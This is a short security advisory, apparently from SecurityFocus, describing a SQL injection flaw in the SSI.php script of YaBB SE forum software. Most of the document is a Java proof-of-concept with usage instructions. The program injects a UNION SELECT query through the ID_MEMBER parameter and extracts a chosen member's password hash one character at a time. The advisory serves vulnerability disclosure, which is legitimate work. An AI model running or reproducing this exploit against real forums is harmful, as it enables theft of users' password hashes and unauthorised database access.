source: http://www.securityfocus.com/bid/9449/info

A problem with YaBB SE could make it possible for a remote user launch SQL injection attacks.

It has been reported that a problem exists in the SSI.php script distributed as part of YaBB SE. Due to insufficient sanitizing of user-supplied URI parameters, it is possible for a remote user to inject arbitrary SQL queries into the database used by YaBB SE. This could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.

/*
* YabbSe SQL Injection test code
* The code is very ugly but it works OK
* Use at your own risk.
* compile:
* javac yabb.java
* exec:
* java yabb http://localhost/yabbse/yabbse154/ yabbse_ 1
* parameters are:
* java yabb [url with path] [database_prefix] [ID_MEMBER]
*/
import java.net.*;
import java.io.*;

public class yabb {
    public static void main(String[] args) throws Exception {

 boolean lastChar = false;
 String Key = "";

        for ( int count=1; count <= 32 ; count++)
        {
  URL yabbForum = new URL(args[0] +
"SSI.php?function=welcome&username=evilhaxor&ID_MEMBER=1%20OR%201=2)%20GROUP
%20BY%20readBy%20UNION%20SELECT%20ASCII(SUBSTRING(passwd,"+count+",1)%20)%20
%20,%20%200%20FROM%20"+args[1]+"members%20WHERE%20ID_MEMBER="+args[2]+"/*");

  BufferedReader in = new BufferedReader(new
InputStreamReader(yabbForum.openStream()));

  String inputLine;

  inputLine = in.readLine();

  int pos  = inputLine.indexOf("action=im");
  int pos2 = inputLine.indexOf(" ", pos + 11);

  if ( pos < 0 )
  {
   System.out.println("ERROR: The server doesn't return any data");
   System.exit(0);
  }

  String theNumber = inputLine.substring( pos + 11, pos2);

  System.out.println(theNumber + "-" + new
Character((char)Integer.parseInt(theNumber.trim())).toString());
  Key += new Character((char)Integer.parseInt(theNumber.trim())).toString();
  in.close();
 }
 System.out.println("Hashed password : " + Key);
    }
}
